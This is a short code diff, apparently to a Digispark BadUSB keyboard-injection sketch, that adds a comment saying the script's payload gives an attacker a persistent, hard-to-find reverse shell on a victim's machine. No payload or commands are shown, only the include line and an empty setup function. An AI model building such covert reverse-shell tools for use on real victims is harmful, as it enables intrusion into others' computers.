@@ -1,4 +1,6 @@
-
+/*
+Using the payload provided, this script will grant the attacker a persistent reverse shell that only if the victim is tech savvy, then will they be able to find it.
+*/
 #include "DigiKeyboard.h"
 void setup() {
 }
